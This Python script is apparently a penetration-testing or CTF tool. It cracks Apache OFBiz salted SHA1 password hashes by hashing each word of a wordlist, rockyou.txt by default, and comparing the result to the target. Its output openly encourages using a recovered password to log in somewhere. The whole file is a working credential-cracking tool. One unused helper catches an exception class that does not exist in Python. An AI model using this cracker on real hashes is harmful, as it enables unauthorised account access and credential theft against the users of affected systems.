import argparse
import hashlib
import base64
import os

def cryptBytes(hash_type, salt, value):
    if not hash_type:
        hash_type = "SHA"
    if not salt:
        salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
    hash_obj = hashlib.new("SHA1" if hash_type == "SHA" else hash_type)
    hash_obj.update(salt.encode('utf-8'))
    hash_obj.update(value)
    hashed_bytes = hash_obj.digest()
    result = f"${hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.').rstrip('=')}"
    return result

def getCryptedBytes(hash_type, salt, value):
    try:
        hash_obj = hashlib.new(hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')
    except hashlib.NoSuchAlgorithmException as e:
        raise Exception(f"Error while computing hash of type {hash_type}: {e}")

def main():
    parser = argparse.ArgumentParser(description="Brute force Apache OFBiz SHA1 hashes. Just something you might want to do....")
    parser.add_argument("--hash-string", help="Hash string in the format '$TYPE$SALT$HASH'", required=True)
    parser.add_argument("--wordlist", help="Path to the wordlist file", default="/usr/share/wordlists/rockyou.txt", required=False)

    args = parser.parse_args()

    hash_components = args.hash_string.split('$')
    hash_type, salt, findhash = hash_components[1], hash_components[2], hash_components[3]

    attempts = 0

    with open(args.wordlist, 'r', encoding='latin-1') as password_list:
        print ("[+] Attempting to crack....")
        for password in password_list:
            attempts += 1
            value = password.strip()
            hashed_password = cryptBytes(hash_type, salt, value.encode('utf-8'))
            if hashed_password == args.hash_string:
                print(f'Found Password: {value}')
                print(f'hash: {hashed_password}')
                print(f'(Attempts: {attempts})')
                print("[!] Super, I bet you could log into something with that!")
                break
        else:
            print(f"[!] Password not found in the wordlist. :( (Attempts: {attempts})")

if __name__ == "__main__":
    main()
